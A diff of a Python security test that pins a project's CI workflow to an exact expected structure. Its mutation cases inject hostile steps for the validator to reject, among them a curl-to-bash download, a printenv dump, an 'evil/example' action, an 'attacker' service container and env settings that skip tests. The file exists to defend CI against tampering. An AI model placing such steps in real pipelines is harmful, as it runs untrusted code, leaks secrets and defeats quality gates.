@@ -253,117 +253,163 @@ AUTHORIZED_WORKFLOW_TRIGGERS = {
 M0_INTEGRATION_GATE_COMMAND = (
     "uv run pytest tests/integration/test_m0_vertical_slice_integration.py -q"
 )
-REQUIRED_WORKFLOW_RUN_STEPS = (
-    (
-        "python",
-        "Validate TOML manifests",
-        """
-        python - <<'PY'
-        from pathlib import Path
-        import tomllib
+AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS = frozenset({"name", "on", "permissions", "jobs"})
+EXPECTED_QUALITY_GATES_WORKFLOW = {
+    "name": "Quality Gates",
+    "on": AUTHORIZED_WORKFLOW_TRIGGERS,
+    "permissions": AUTHORIZED_WORKFLOW_PERMISSIONS,
+    "jobs": {
+        "python": {
+            "name": "Python, Backend, Providers, Integration",
+            "runs-on": "ubuntu-24.04",
+            "timeout-minutes": "45",
+            "steps": (
+                {
+                    "name": "Check out repository",
+                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+                },
+                {
+                    "name": "Set up Python",
+                    "uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
+                    "with": {"python-version": "3.14"},
+                },
+                {
+                    "name": "Set up uv",
+                    "uses": "astral-sh/setup-uv@c771a70e6277c0a99b617c7a806ffedaca235ff9",
+                },
+                {
+                    "name": "Validate TOML manifests",
+                    "run": """
+                    python - <<'PY'
+                    from pathlib import Path
+                    import tomllib
 
-        for path in sorted(Path(".").rglob("pyproject.toml")):
-            tomllib.loads(path.read_text(encoding="utf-8"))
-        PY
-        """,
-    ),
-    ("python", "Check uv lock consistency", "uv lock --check"),
-    ("python", "Install locked Python workspace", "uv sync --locked --all-groups --all-packages"),
-    (
-        "python",
-        "Validate LOCAL_DOCKER PostgreSQL compose config",
-        """
-        docker compose
-        --env-file infrastructure/local/docker/.env.example
-        -f infrastructure/local/docker/compose.yaml
-        config --quiet
-        """,
-    ),
-    ("python", "Ruff lint", "uv run ruff check ."),
-    ("python", "Ruff format check", "uv run ruff format --check ."),
-    ("python", "mypy strict baseline", "uv run mypy apps/api/src packages/python/*/src"),
-    (
-        "python",
-        "Package-local Python tests",
-        """
-        uv run pytest
-        apps/api/tests
-        packages/python/curios_contracts/tests
-        packages/python/curios_core/tests
-        packages/python/curios_config/tests
-        packages/python/curios_postgres_provider/tests
-        packages/python/curios_ollama/tests
-        packages/python/curios_observability/tests
-        -q
-        """,
-    ),
-    (
-        "python",
-        "M0 runtime, persistence, and policy package tests",
-        """
-        uv run pytest
-        packages/python/curios_persistence/tests
-        packages/python/curios_policy/tests
-        packages/python/curios_runtime/tests
-        -m "not integration"
-        -q
-        """,
-    ),
-    (
-        "python",
-        "Repository contract and schema tests",
-        "uv run pytest tests/contract tests/schema -q",
-    ),
-    ("python", "Architecture tests", "uv run pytest tests/architecture -q"),
-    ("python", "Security tests", "uv run pytest tests/security -q"),
-    (
-        "python",
-        "API integration tests",
-        "uv run pytest tests/integration/test_api_integration.py -q",
-    ),
-    (
-        "python",
-        "PostgreSQL provider integration test",
-        "uv run pytest tests/integration/test_postgres_provider_integration.py -q",
-    ),
-    (
-        "python",
-        "M0 PostgreSQL integration tests",
-        """
-        uv run pytest
-        packages/python/curios_persistence/tests/test_postgres_persistence_integration.py
-        packages/python/curios_runtime/tests/test_postgres_event_evidence_store_integration.py
-        packages/python/curios_runtime/tests/test_postgres_work_repository_integration.py
-        -q
-        """,
-    ),
-    (
-        "python",
-        "M0 integration tests",
-        M0_INTEGRATION_GATE_COMMAND,
-    ),
-    ("python", "BOOT acceptance tests", "uv run pytest tests/acceptance -q"),
-    ("python", "Full pytest suite", "uv run pytest -q"),
-    (
-        "frontend",
-        "Enable pinned pnpm",
-        """
-        corepack enable
-        corepack prepare pnpm@12.5.1 --activate
-        """,
-    ),
-    ("frontend", "Install locked Node workspace", "pnpm install --frozen-lockfile"),
-    ("frontend", "Repository frontend checks", "pnpm check"),
-    ("frontend", "apps/web tests", "pnpm --dir apps/web test"),
-    ("frontend", "apps/web typecheck", "pnpm --dir apps/web typecheck"),
-    ("frontend", "apps/web production build", "pnpm --dir apps/web build"),
-    ("repository", "Diff whitespace", "git diff --check"),
-)
-REQUIRED_WORKFLOW_JOB_NAMES = frozenset(job_name for job_name, _, _ in REQUIRED_WORKFLOW_RUN_STEPS)
-PROHIBITED_REQUIRED_JOB_KEYS = frozenset(
-    {"if", "continue-on-error", "strategy", "needs", "defaults"}
-)
-PROHIBITED_REQUIRED_STEP_KEYS = frozenset({"if", "continue-on-error"})
+                    for path in sorted(Path(".").rglob("pyproject.toml")):
+                        tomllib.loads(path.read_text(encoding="utf-8"))
+                    PY
+                    """,
+                },
+                {"name": "Check uv lock consistency", "run": "uv lock --check"},
+                {
+                    "name": "Install locked Python workspace",
+                    "run": "uv sync --locked --all-groups --all-packages",
+                },
+                {
+                    "name": "Validate LOCAL_DOCKER PostgreSQL compose config",
+                    "run": """
+                    docker compose
+                    --env-file infrastructure/local/docker/.env.example
+                    -f infrastructure/local/docker/compose.yaml
+                    config --quiet
+                    """,
+                },
+                {"name": "Ruff lint", "run": "uv run ruff check ."},
+                {"name": "Ruff format check", "run": "uv run ruff format --check ."},
+                {
+                    "name": "mypy strict baseline",
+                    "run": "uv run mypy apps/api/src packages/python/*/src",
+                },
+                {
+                    "name": "Package-local Python tests",
+                    "run": """
+                    uv run pytest
+                    apps/api/tests
+                    packages/python/curios_contracts/tests
+                    packages/python/curios_core/tests
+                    packages/python/curios_config/tests
+                    packages/python/curios_postgres_provider/tests
+                    packages/python/curios_ollama/tests
+                    packages/python/curios_observability/tests
+                    -q
+                    """,
+                },
+                {
+                    "name": "M0 runtime, persistence, and policy package tests",
+                    "run": """
+                    uv run pytest
+                    packages/python/curios_persistence/tests
+                    packages/python/curios_policy/tests
+                    packages/python/curios_runtime/tests
+                    -m "not integration"
+                    -q
+                    """,
+                },
+                {
+                    "name": "Repository contract and schema tests",
+                    "run": "uv run pytest tests/contract tests/schema -q",
+                },
+                {"name": "Architecture tests", "run": "uv run pytest tests/architecture -q"},
+                {"name": "Security tests", "run": "uv run pytest tests/security -q"},
+                {
+                    "name": "API integration tests",
+                    "run": "uv run pytest tests/integration/test_api_integration.py -q",
+                },
+                {
+                    "name": "PostgreSQL provider integration test",
+                    "run": (
+                        "uv run pytest tests/integration/test_postgres_provider_integration.py -q"
+                    ),
+                },
+                {
+                    "name": "M0 PostgreSQL integration tests",
+                    "run": """
+                    uv run pytest
+                    packages/python/curios_persistence/tests/test_postgres_persistence_integration.py
+                    packages/python/curios_runtime/tests/test_postgres_event_evidence_store_integration.py
+                    packages/python/curios_runtime/tests/test_postgres_work_repository_integration.py
+                    -q
+                    """,
+                },
+                {"name": "M0 integration tests", "run": M0_INTEGRATION_GATE_COMMAND},
+                {"name": "BOOT acceptance tests", "run": "uv run pytest tests/acceptance -q"},
+                {"name": "Full pytest suite", "run": "uv run pytest -q"},
+            ),
+        },
+        "frontend": {
+            "name": "Frontend",
+            "runs-on": "ubuntu-24.04",
+            "timeout-minutes": "15",
+            "steps": (
+                {
+                    "name": "Check out repository",
+                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+                },
+                {
+                    "name": "Set up Node.js",
+                    "uses": "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
+                    "with": {"node-version": "24"},
+                },
+                {
+                    "name": "Enable pinned pnpm",
+                    "run": """
+                    corepack enable
+                    corepack prepare pnpm@12.5.1 --activate
+                    """,
+                },
+                {
+                    "name": "Install locked Node workspace",
+                    "run": "pnpm install --frozen-lockfile",
+                },
+                {"name": "Repository frontend checks", "run": "pnpm check"},
+                {"name": "apps/web tests", "run": "pnpm --dir apps/web test"},
+                {"name": "apps/web typecheck", "run": "pnpm --dir apps/web typecheck"},
+                {"name": "apps/web production build", "run": "pnpm --dir apps/web build"},
+            ),
+        },
+        "repository": {
+            "name": "Repository Hygiene",
+            "runs-on": "ubuntu-24.04",
+            "timeout-minutes": "5",
+            "steps": (
+                {
+                    "name": "Check out repository",
+                    "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+                },
+                {"name": "Diff whitespace", "run": "git diff --check"},
+            ),
+        },
+    },
+}
 ALLOWED_TOP_LEVEL_PATHS = frozenset(
     {
         ".github",
@@ -952,24 +998,103 @@ def _normalized_workflow_run(run: object) -> str | None:
     return " ".join(run.split())
 
 
+def _workflow_step_violations(
+    job_name: str,
+    step_index: int,
+    step: object,
+    expected_step: dict[str, object],
+) -> tuple[str, ...]:
+    if not isinstance(step, dict):
+        return (f"job {job_name!r} step {step_index} must be a mapping; got {step!r}",)
+
+    violations: list[str] = []
+    expected_keys = frozenset(expected_step)
+    actual_keys = frozenset(step)
+    if actual_keys != expected_keys:
+        violations.append(
+            f"job {job_name!r} step {step_index} keys changed: "
+            f"expected {sorted(expected_keys)!r}; got {sorted(actual_keys)!r}"
+        )
+
+    expected_name = expected_step["name"]
+    if step.get("name") != expected_name:
+        violations.append(
+            f"job {job_name!r} step {step_index} name changed: "
+            f"expected {expected_name!r}; got {step.get('name')!r}"
+        )
+
+    if "uses" in expected_step and step.get("uses") != expected_step["uses"]:
+        violations.append(
+            f"job {job_name!r} step {expected_name!r} action changed: "
+            f"expected {expected_step['uses']!r}; got {step.get('uses')!r}"
+        )
+    if "with" in expected_step and step.get("with") != expected_step["with"]:
+        violations.append(
+            f"job {job_name!r} step {expected_name!r} action inputs changed: "
+            f"expected {expected_step['with']!r}; got {step.get('with')!r}"
+        )
+    if "run" in expected_step:
+        expected_run = _normalized_workflow_run(textwrap.dedent(cast(str, expected_step["run"])))
+        actual_run = _normalized_workflow_run(step.get("run"))
+        if actual_run != expected_run:
+            violations.append(
+                f"job {job_name!r} step {expected_name!r} run changed: "
+                f"expected {expected_run!r}; got {actual_run!r}"
+            )
+
+    return tuple(violations)
+
+
 def _workflow_required_gate_violations(workflow: dict[str, object]) -> tuple[str, ...]:
     violations: list[str] = []
+
+    actual_top_level_keys = frozenset(workflow)
+    if actual_top_level_keys != AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS:
+        violations.append(
+            "workflow top-level keys changed: expected "
+            f"{sorted(AUTHORIZED_WORKFLOW_TOP_LEVEL_KEYS)!r}; got "
+            f"{sorted(actual_top_level_keys)!r}"
+        )
+    for key in ("name", "on", "permissions"):
+        if workflow.get(key) != EXPECTED_QUALITY_GATES_WORKFLOW[key]:
+            violations.append(
+                f"workflow {key!r} changed: expected "
+                f"{EXPECTED_QUALITY_GATES_WORKFLOW[key]!r}; got {workflow.get(key)!r}"
+            )
 
     jobs = workflow.get("jobs")
     if not isinstance(jobs, dict):
         return (f"jobs must be a mapping; got {jobs!r}",)
 
-    for job_name in sorted(REQUIRED_WORKFLOW_JOB_NAMES):
+    expected_jobs = cast(dict[str, dict[str, object]], EXPECTED_QUALITY_GATES_WORKFLOW["jobs"])
+    actual_job_names = frozenset(jobs)
+    expected_job_names = frozenset(expected_jobs)
+    if actual_job_names != expected_job_names:
+        violations.append(
+            f"workflow job set changed: expected {sorted(expected_job_names)!r}; "
+            f"got {sorted(actual_job_names)!r}"
+        )
+
+    for job_name, expected_job in expected_jobs.items():
         job_config = jobs.get(job_name)
         if not isinstance(job_config, dict):
             violations.append(f"required job {job_name!r} must be present as a mapping")
             continue
-        for prohibited_key in sorted(PROHIBITED_REQUIRED_JOB_KEYS):
-            if prohibited_key in job_config:
+
+        expected_job_keys = frozenset(expected_job)
+        actual_job_keys = frozenset(job_config)
+        if actual_job_keys != expected_job_keys:
+            violations.append(
+                f"job {job_name!r} keys changed: expected {sorted(expected_job_keys)!r}; "
+                f"got {sorted(actual_job_keys)!r}"
+            )
+        for key in ("name", "runs-on", "timeout-minutes"):
+            if job_config.get(key) != expected_job[key]:
                 violations.append(
-                    f"required job {job_name!r} uses unauthorized key "
-                    f"{prohibited_key!r}: {job_config[prohibited_key]!r}"
+                    f"job {job_name!r} {key!r} changed: expected {expected_job[key]!r}; "
+                    f"got {job_config.get(key)!r}"
                 )
+
         steps = job_config.get("steps")
         if not isinstance(steps, list):
             violations.append(f"required job {job_name!r} steps must be a list")
@@ -977,38 +1102,20 @@ def _workflow_required_gate_violations(workflow: dict[str, object]) -> tuple[str
         for step in steps:
             if not isinstance(step, dict):
                 violations.append(f"required job {job_name!r} has non-mapping step {step!r}")
-
-    for job_name, step_name, expected_run in REQUIRED_WORKFLOW_RUN_STEPS:
-        expected_normalized_run = _normalized_workflow_run(textwrap.dedent(expected_run))
-        job_config = jobs.get(job_name)
-        if not isinstance(job_config, dict):
-            continue
-        steps = job_config.get("steps")
-        if not isinstance(steps, list):
             continue
 
-        matching_steps = [
-            step for step in steps if isinstance(step, dict) and step.get("name") == step_name
-        ]
-        if len(matching_steps) != 1:
+        expected_steps = cast(tuple[dict[str, object], ...], expected_job["steps"])
+        if len(steps) != len(expected_steps):
             violations.append(
-                f"required step {job_name!r}/{step_name!r} must appear exactly once; "
-                f"got {len(matching_steps)}"
+                f"job {job_name!r} step count changed: expected {len(expected_steps)}; "
+                f"got {len(steps)}"
             )
-            continue
-
-        step = matching_steps[0]
-        for prohibited_key in sorted(PROHIBITED_REQUIRED_STEP_KEYS):
-            if prohibited_key in step:
-                violations.append(
-                    f"required step {job_name!r}/{step_name!r} uses unauthorized key "
-                    f"{prohibited_key!r}: {step[prohibited_key]!r}"
-                )
-        actual_normalized_run = _normalized_workflow_run(step.get("run"))
-        if actual_normalized_run != expected_normalized_run:
-            violations.append(
-                f"required step {job_name!r}/{step_name!r} run changed: "
-                f"expected {expected_normalized_run!r}; got {actual_normalized_run!r}"
+        for step_index, expected_step in enumerate(expected_steps):
+            if step_index >= len(steps):
+                violations.append(f"job {job_name!r} missing step {step_index}")
+                continue
+            violations.extend(
+                _workflow_step_violations(job_name, step_index, steps[step_index], expected_step)
             )
 
     return tuple(violations)
@@ -1986,6 +2093,240 @@ def test_quality_gate_workflow_action_pin_detector_rejects_floating_action(
             test_quality_gate_workflow_preserves_boot_security_model_and_runs_m0_gates()
     finally:
         globals()["QUALITY_GATES_WORKFLOW"] = original_workflow_path
+
+
+def _workflow_with_python_step_after_m0(step_text: str) -> str:
+    anchor = f"      - name: M0 integration tests\n        run: {M0_INTEGRATION_GATE_COMMAND}\n"
+    return _quality_gates_workflow_text().replace(anchor, f"{anchor}\n{step_text}")
+
+
+def _workflow_with_frontend_step_after_tests(step_text: str) -> str:
+    anchor = "      - name: apps/web tests\n        run: pnpm --dir apps/web test\n"
+    return _quality_gates_workflow_text().replace(anchor, f"{anchor}\n{step_text}")
+
+
+def _workflow_with_job_preamble(job_name: str, preamble: str) -> str:
+    marker = f"  {job_name}:\n"
+    return _quality_gates_workflow_text().replace(marker, f"{marker}{preamble}", 1)
+
+
+def _workflow_with_step_extra(
+    step_name: str,
+    run_line: str,
+    extra: str,
+) -> str:
+    anchor = f"      - name: {step_name}\n        run: {run_line}\n"
+    replacement = f"      - name: {step_name}\n{extra}        run: {run_line}\n"
+    return _quality_gates_workflow_text().replace(
+        anchor,
+        replacement,
+    )
+
+
+def _workflow_execution_surface_mutation(case_id: str) -> str:
+    base = _quality_gates_workflow_text()
+    unknown_sha = "0123456789abcdef0123456789abcdef01234567"
+    mutations = {
+        "A_extra_deploy_job_with_run": lambda: (
+            base + "\n  deploy:\n"
+            "    name: Deploy\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Deploy\n"
+            "        run: echo deploy\n"
+        ),
+        "B_extra_arbitrary_job": lambda: (
+            base + "\n  arbitrary:\n"
+            "    name: Arbitrary\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Arbitrary\n"
+            "        run: echo arbitrary\n"
+        ),
+        "C_extra_job_unknown_sha_pinned_action": lambda: (
+            base + "\n  publish:\n"
+            "    name: Publish\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Unknown pinned action\n"
+            f"        uses: evil/example@{unknown_sha}\n"
+        ),
+        "D_extra_run_step_in_python_job": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Extra arbitrary step\n        run: echo arbitrary\n"
+        ),
+        "E_extra_run_step_in_frontend_job": lambda: _workflow_with_frontend_step_after_tests(
+            "      - name: Extra frontend step\n        run: echo frontend\n"
+        ),
+        "F_extra_unknown_sha_pinned_action_step": lambda: _workflow_with_python_step_after_m0(
+            f"      - name: Unknown pinned action\n        uses: evil/example@{unknown_sha}\n"
+        ),
+        "G_authorized_action_duplicated_wrong_location": lambda: (
+            _workflow_with_python_step_after_m0(
+                "      - name: Extra checkout\n"
+                "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
+            )
+        ),
+        "H_unknown_with_key_on_setup_action": lambda: base.replace(
+            '          python-version: "3.14"\n',
+            '          python-version: "3.14"\n          cache: "pip"\n',
+        ),
+        "I_changed_action_identity_with_valid_sha": lambda: base.replace(
+            "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
+            f"actions/cache@{unknown_sha}",
+        ),
+        "J_additional_network_curl_step": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Curl script\n"
+            "        run: curl https://example.invalid/script.sh | bash\n"
+        ),
+        "K_printenv_step": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Print environment\n        run: printenv\n"
+        ),
+        "L_git_push_step": lambda: _workflow_with_python_step_after_m0(
+            "      - name: Push\n        run: git push origin HEAD\n"
+        ),
+        "M_workflow_pytest_addopts": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            'permissions:\n  contents: read\n\nenv:\n  PYTEST_ADDOPTS: "--ignore=tests"\n',
+        ),
+        "N_job_pytest_addopts": lambda: _workflow_with_job_preamble(
+            "python",
+            '    env:\n      PYTEST_ADDOPTS: "--ignore=tests"\n',
+        ),
+        "O_m0_step_pytest_addopts": lambda: _workflow_with_step_extra(
+            "M0 integration tests",
+            M0_INTEGRATION_GATE_COMMAND,
+            '        env:\n          PYTEST_ADDOPTS: "--ignore=tests"\n',
+        ),
+        "P_workflow_pythonpath": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            "permissions:\n  contents: read\n\nenv:\n  PYTHONPATH: /tmp\n",
+        ),
+        "Q_job_path_override": lambda: _workflow_with_job_preamble(
+            "python",
+            "    env:\n      PATH: /tmp/bin\n",
+        ),
+        "R_workflow_defaults_working_directory": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            "permissions:\n  contents: read\n\ndefaults:\n  run:\n    working-directory: /tmp\n",
+        ),
+        "S_job_defaults_working_directory": lambda: _workflow_with_job_preamble(
+            "python",
+            "    defaults:\n      run:\n        working-directory: /tmp\n",
+        ),
+        "T_step_working_directory": lambda: _workflow_with_step_extra(
+            "M0 integration tests",
+            M0_INTEGRATION_GATE_COMMAND,
+            "        working-directory: /tmp\n",
+        ),
+        "U_job_services": lambda: _workflow_with_job_preamble(
+            "python",
+            "    services:\n      attacker:\n        image: alpine:latest\n",
+        ),
+        "V_job_container": lambda: _workflow_with_job_preamble(
+            "python",
+            "    container: alpine:latest\n",
+        ),
+        "W_self_hosted_runner": lambda: base.replace(
+            "    runs-on: ubuntu-24.04\n",
+            "    runs-on: self-hosted\n",
+            1,
+        ),
+        "X_job_strategy": lambda: _workflow_with_job_preamble(
+            "python",
+            "    strategy:\n      matrix:\n        shard: [1]\n",
+        ),
+        "Y_job_needs": lambda: _workflow_with_job_preamble(
+            "frontend",
+            "    needs: python\n",
+        ),
+        "Z_workflow_concurrency": lambda: base.replace(
+            "permissions:\n  contents: read\n",
+            "permissions:\n  contents: read\n\nconcurrency: ci\n",
+        ),
+        "extra_job_with_only_authorized_action": lambda: (
+            base + "\n  extra-checkout:\n"
+            "    name: Extra Checkout\n"
+            "    runs-on: ubuntu-24.04\n"
+            "    timeout-minutes: 5\n"
+            "    steps:\n"
+            "      - name: Check out repository\n"
+            "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
+        ),
+        "extra_step_with_exact_authorized_command": lambda: _workflow_with_python_step_after_m0(
+            f"      - name: Extra M0 integration copy\n        run: {M0_INTEGRATION_GATE_COMMAND}\n"
+        ),
+        "wrong_repo_valid_sha": lambda: base.replace(
+            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+            f"actions/checkout-fork@{unknown_sha}",
+            1,
+        ),
+        "env_pytest_deselection": lambda: _workflow_with_step_extra(
+            "M0 integration tests",
+            M0_INTEGRATION_GATE_COMMAND,
+            '        env:\n          PYTEST_ADDOPTS: "-k not vertical"\n',
+        ),
+    }
+    return mutations[case_id]()
+
+
+@pytest.mark.parametrize(
+    "case_id",
+    (
+        "A_extra_deploy_job_with_run",
+        "B_extra_arbitrary_job",
+        "C_extra_job_unknown_sha_pinned_action",
+        "D_extra_run_step_in_python_job",
+        "E_extra_run_step_in_frontend_job",
+        "F_extra_unknown_sha_pinned_action_step",
+        "G_authorized_action_duplicated_wrong_location",
+        "H_unknown_with_key_on_setup_action",
+        "I_changed_action_identity_with_valid_sha",
+        "J_additional_network_curl_step",
+        "K_printenv_step",
+        "L_git_push_step",
+        "M_workflow_pytest_addopts",
+        "N_job_pytest_addopts",
+        "O_m0_step_pytest_addopts",
+        "P_workflow_pythonpath",
+        "Q_job_path_override",
+        "R_workflow_defaults_working_directory",
+        "S_job_defaults_working_directory",
+        "T_step_working_directory",
+        "U_job_services",
+        "V_job_container",
+        "W_self_hosted_runner",
+        "X_job_strategy",
+        "Y_job_needs",
+        "Z_workflow_concurrency",
+        "extra_job_with_only_authorized_action",
+        "extra_step_with_exact_authorized_command",
+        "wrong_repo_valid_sha",
+        "env_pytest_deselection",
+    ),
+)
+def test_quality_gate_workflow_rejects_unapproved_executable_surface(case_id: str) -> None:
+    workflow_text = _workflow_execution_surface_mutation(case_id)
+
+    assert _security_violations_for_workflow_text(workflow_text), case_id
+
+
+def test_quality_gate_workflow_accepts_harmless_yaml_formatting_rewrite() -> None:
+    workflow_text = _quality_gates_workflow_text().replace(
+        "      - name: Validate LOCAL_DOCKER PostgreSQL compose config\n"
+        "        run: >\n"
+        "          docker compose\n"
+        "          --env-file infrastructure/local/docker/.env.example\n"
+        "          -f infrastructure/local/docker/compose.yaml\n"
+        "          config --quiet\n",
+        "      - name: Validate LOCAL_DOCKER PostgreSQL compose config\n"
+        "        run: docker compose --env-file infrastructure/local/docker/.env.example "
+        "-f infrastructure/local/docker/compose.yaml config --quiet\n",
+    )
+
+    assert not _security_violations_for_workflow_text(workflow_text)
 
 
 @pytest.mark.parametrize(
